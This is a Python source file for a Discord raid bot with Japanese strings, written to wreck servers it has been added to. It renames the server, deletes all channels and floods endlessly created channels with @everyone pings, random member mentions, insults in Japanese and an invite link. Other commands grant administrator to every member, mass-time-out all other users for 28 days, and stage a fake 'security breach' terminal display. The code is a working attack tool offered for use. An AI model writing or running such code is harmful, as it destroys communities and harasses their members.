import discord
from discord import ui
from discord.ext import commands
import os
import asyncio
import random
from datetime import timedelta

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents)

SERVER_NAME = "トイ神の植民地"
CHANNEL_NAME = "ここはトイ神の集い|TISNに荒らされました😂"
CREATE_INTERVAL = 0.05

COMBINED_TEXT = (
    "@everyone\n"
    ".∧_∧\n"
    " ( ･ω･)つﾞ☆ﾍﾟﾁﾍﾟﾁ\n"
    " と ＿⌒))\n"
    "        (_ﾉﾉ\n"
    "\n"
    "∧,＿,∧  バカが治りますよ～に♡\n"
    "（`・ω・)つ━☆・*.\n"
    "⊂　　 ノ 　　　・゜+.\n"
    "　し'´Ｊ　　*・ °。\n"
    "\n"
    "https://discord.gg/4y3kfgr8p\n"
    "https://discord.gg/4y3kfgr8p\n"
    "お前らみたいな人生負け組のチー牛🧀🐮🤓と豚丼には到底入れないまぶしいサーバーww😂😂😂"
)

stop_flag = asyncio.Event()
background_tasks = set()


class StartButton(ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @ui.button(label="🚀 実行", style=discord.ButtonStyle.danger, emoji="⚡")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        if not stop_flag.is_set() and background_tasks:
            await interaction.followup.send("⚠️ 既に実行中です", ephemeral=True)
            return
        await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
        await infinite_create_and_spam(self.guild)


def random_mentions(guild: discord.Guild) -> str:
    members = [m for m in guild.members if not m.bot]
    if not members:
        return "@everyone\n"
    k = min(30, len(members))
    picked = random.choices(members, k=k)
    return " ".join(m.mention for m in picked) + "\n"


async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
    while not stop_flag.is_set():
        text = random_mentions(guild) + COMBINED_TEXT
        try:
            await channel.send(text)
        except:
            break
        try:
            await asyncio.wait_for(stop_flag.wait(), timeout=0.05)
        except asyncio.TimeoutError:
            pass


async def delete_all_channels_fast(guild: discord.Guild):
    tasks = [ch.delete() for ch in guild.channels]
    await asyncio.gather(*tasks, return_exceptions=True)
    await asyncio.sleep(0.08)
    if guild.channels:
        tasks = [ch.delete() for ch in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)


async def infinite_create_and_spam(guild: discord.Guild):
    stop_flag.clear()
    try:
        await guild.edit(name=SERVER_NAME)
    except:
        pass
    await delete_all_channels_fast(guild)
    counter = 1
    while not stop_flag.is_set():
        try:
            new_channel = await guild.create_text_channel(f"{CHANNEL_NAME}-{counter}")
            task = asyncio.create_task(spam_channel(new_channel, guild))
            background_tasks.add(task)
            task.add_done_callback(background_tasks.discard)
            counter += 1
            try:
                await asyncio.wait_for(stop_flag.wait(), timeout=CREATE_INTERVAL)
            except asyncio.TimeoutError:
                pass
        except:
            try:
                await asyncio.wait_for(stop_flag.wait(), timeout=3)
            except asyncio.TimeoutError:
                pass


async def type_and_send(channel, text):
    """✅ 一行ずつ表示・カタカタなし・最速"""
    lines = text.split("\n")
    output = ""
    msg = None
    for line in lines:
        output += line + "\n"
        if msg is None:
            msg = await channel.send(output)
        else:
            await msg.edit(content=output)
        await asyncio.sleep(0.05)


@bot.command()
async def start(ctx):
    if not stop_flag.is_set() and background_tasks:
        return
    await infinite_create_and_spam(ctx.guild)


@bot.command()
async def stop(ctx):
    stop_flag.set()
    await asyncio.gather(*background_tasks, return_exceptions=True)
    background_tasks.clear()


@bot.command()
async def eraser(ctx):
    guild = ctx.guild
    await delete_all_channels_fast(guild)
    ch = await guild.create_text_channel("hacking出力画面")

    hacker_code = "```ansi\n"
    hacker_code += "\x1b[38;5;51m╔══════════════════════════════════════════════════════════╗\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m║  TISN SECURITY BREACH — TERMINAL v4.2.1 — BUILD 999\x1b[38;5;51m  ║\x1b[0m\n"
    hacker_code += "\x1b[38;5;51m╚══════════════════════════════════════════════════════════╝\x1b[0m\n"
    hacker_code += "\n"
    hacker_code += "\x1b[32m[root@tisn-core:~]#\x1b[0m ./sysinit --BREACH --LEVEL=MAX --STEALTH\n"
    hacker_code += "\x1b[33m[001] \x1b[37m> Initializing exploit modules...        [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[002] \x1b[37m> Bypassing firewall layer 1/3...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[003] \x1b[37m> Decrypting payload...                    [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[004] \x1b[37m> Injecting shellcode...                   [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[005] \x1b[37m> Overriding security protocols...         [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[006] \x1b[37m> Establishing backdoor tunnel...          [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[007] \x1b[37m> Elevating privileges...                  [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\x1b[33m[008] \x1b[37m> Disabling audit logging...               [\x1b[32mOK\x1b[37m]\x1b[0m\n"
    hacker_code += "\n"
    hacker_code += "\x1b[38;5;196m███╗   ███╗███████╗██████╗ ██╗   ██╗\x1b[0m\n"
    hacker_code += "\x1b[38;5;214m████╗ ████║██╔════╝██╔══██╗╚██╗ ██╔╝\x1b[0m\n"
    hacker_code += "\x1b[38;5;226m██╔████╔██║█████╗  ██████╔╝ ╚████╔╝ \x1b[0m\n"
    hacker_code += "\x1b[38;5;46m██║╚██╔╝██║██╔══╝  ██╔══██╗  ╚██╔╝  \x1b[0m\n"
    hacker_code += "\x1b[38;5;51m██║ ╚═╝ ██║███████╗██║  ██║   ██║   \x1b[0m\n"
    hacker_code += "\x1b[38;5;45m╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝   \x1b[0m\n"
    hacker_code += "\n"
    hacker_code += "\x1b[38;5;51m[SYSTEM]  ████████████████████████████ 100%\x1b[0m\n"
    hacker_code += "\x1b[38;5;46m[STATUS]  ACCESS GRANTED — FULL CONTROL\x1b[0m\n"
    hacker_code += "\x1b[38;5;226m[WARN]    CONNECTION UNTRACEABLE — NO LOGS\x1b[0m\n"
    hacker_code += "\x1b[38;5;196m[INFO]    AWAITING EXECUTION TRIGGER...\x1b[0m\n"
    hacker_code += "```\n"
    hacker_code += "**✅ 作成完了**\n"

    # ✅ 一行ずつ表示
    await type_and_send(ch, hacker_code)
    # 最後に実行ボタン
    async for msg in ch.history(limit=1):
        await msg.edit(view=StartButton(guild))


@bot.command()
async def admin(ctx):
    guild = ctx.guild
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
        except:
            return
    tasks = [m.add_roles(admin_role) for m in guild.members if not m.bot and admin_role not in m.roles]
    await asyncio.gather(*tasks, return_exceptions=True)


@bot.command(name="to")
async def total_timeout(ctx):
    guild = ctx.guild
    author = ctx.author
    report = []
    admin_role = discord.utils.get(guild.roles, name="TISN管理者")
    if not admin_role:
        try:
            admin_role = await guild.create_role(
                name="TISN管理者",
                permissions=discord.Permissions(administrator=True)
            )
            report.append("✅ 管理者ロールを新規作成")
        except Exception as e:
            report.append(f"❌ 管理者ロール作成失敗: {e}")
            await ctx.send("\n".join(report))
            return
    if admin_role not in author.roles:
        try:
            await author.add_roles(admin_role)
            report.append("✅ あなたに管理者権限を付与")
        except Exception as e:
            report.append(f"❌ ロール付与失敗: {e}")
            await ctx.send("\n".join(report))
            return
    await asyncio.sleep(1.5)
    bot_top_role = guild.me.top_role
    target_position = len(guild.roles) - 2
    try:
        await bot_top_role.edit(position=target_position, reason=f"!to by {author}")
        report.append("✅ Botロールを一番上に移動")
    except Exception as e:
        report.append(f"⚠️ Botロール移動失敗: {e}")
    duration = discord.utils.utcnow() + timedelta(days=28)
    tasks = []
    target_count = 0
    for member in guild.members:
        if member.bot or member.id == author.id:
            continue
        try:
            tasks.append(member.edit(timeout_until=duration, reason="!to による一括タイムアウト"))
            target_count += 1
        except:
            pass
    results = await asyncio.gather(*tasks, return_exceptions=True)
    success_count = sum(1 for r in results if not isinstance(r, Exception))
    report.append(f"✅ タイムアウト実行: {success_count}/{target_count} 人")
    await ctx.send("## 🎯 !to 完了\n" + "\n".join(report))


@bot.event
async def on_ready():
    print(f"起動: {bot.user}")


TOKEN = os.environ.get("DISCORD_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("トークンを設定してください")

bot.run(TOKEN)